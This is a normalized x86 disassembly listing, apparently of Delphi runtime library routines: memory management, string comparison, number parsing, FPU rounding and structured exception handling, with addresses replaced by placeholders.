mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a8c
jmp r-xdata
sub_402380
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_402512
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401b04
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401460
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401468
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403a8c
jmp r-xdata
call sub_401f98
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401ca8
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401f10
mov edx [ eax + 0x8 ]
add ebx edx
call sub_401ca8
sub_402524
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401f98
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401ca8
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_40209c
test al al
je r-xdata
call sub_401ca8
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401d6c
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401f10
jmp r-xdata
sub_402700
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4027b1
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401b04
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_402524
test al al
je r-xdata
push rw-data
call sub_401460
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4021f0
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4029c0
mov eax ebx
call sub_402380
retn
push rw-data
call sub_401468
sub_4027c4
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402920
sub_4027e4
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402920
sub_402804
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402920
mov [ ecx ] eax
mov al 0x2
jmp sub_402920
retn
mov [ ecx ] eax
retn
sub_402894
push ebx
push esi
call sub_406138
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_406138
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_406138
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4028d4
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_406138
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4028c8
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_40295c
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4029c0
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402a30
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402a70
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_40294c
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402ac4
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_40294c
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_40294c
jmp r-xdata
sub_402b1c
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402b58
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4029c0
pop ebx
retn
mov ecx ebx
sub_402b74
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402bf8
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402c68
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402c88
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402d68
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402da8
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e5b ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e5b ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402e5b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_403094
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_4030c4
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4013bc
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403135
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4013c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4013b4
retn
sub_4031b8
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403260
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4032b8
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_404a0c
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4032d8
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_405a20
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_403308
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_40338c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_40339c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403393
lea eax [ ebp - 0x8 ]
call sub_405a08
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4032d8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405a20
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_40339c
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4033e0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403480
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403420
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403450
push eax
push ecx
mov eax [ eax ]
call sub_403420
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f98
call [ rw-data ]
sub_403468
push esi
mov esi edx
mov eax [ eax ]
call sub_403420
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f98
call [ rw-data ]
sub_4034b0
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403420
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4034d8
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403528
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403578
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4035a1
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_40360c
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403648
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_40365c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403670
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403690
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403670
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4036f4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403188
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_406138
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_40365c
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_40360c
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403820
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403188
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_40360c
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_406138
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403648
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
